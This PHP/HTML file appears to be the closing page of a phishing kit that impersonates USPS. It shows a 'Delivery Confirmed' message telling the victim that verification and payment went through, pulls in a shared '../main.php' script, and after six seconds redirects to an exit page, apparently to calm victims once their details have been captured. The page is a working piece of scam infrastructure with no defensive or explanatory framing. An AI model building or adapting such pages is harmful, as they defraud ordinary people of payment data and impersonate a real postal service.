<?php 
require '../main.php';

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<app>
<header>
    <div class="pc">
        <img src="res/html/header-xl.png" class="xl">
        <img src="res/html/header-md.png" class="md">
    </div>
    <div class="mobile">
        <img src="res/left.png" class="left">
        <img src="res/mid.png" class="mid">
        <img src="res/right.png" class="right">
    </div>
</header>
<main>
<div class="form">
<div class="bigtitle" style="color:#068f4c; border-left-color:#068f4c;">Delivery Confirmed</div>
<div class="liner"></div>
<div class="text">Your verification process has been completed successfully, and everything is now in order. Your delivery will be rescheduled to begin within the next 24 hours. A receipt confirming your payment and delivery processing will be sent to your provided contact information. Thank you for your patience and for choosing <strong>USPS</strong>.</div>

 
 


<div class="liner"></div>

</div>
</main>



<footer>
</footer>
</app>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setTimeout(() => {
    window.location="exit.php";
}, 6000);

</script>
</body>
</html>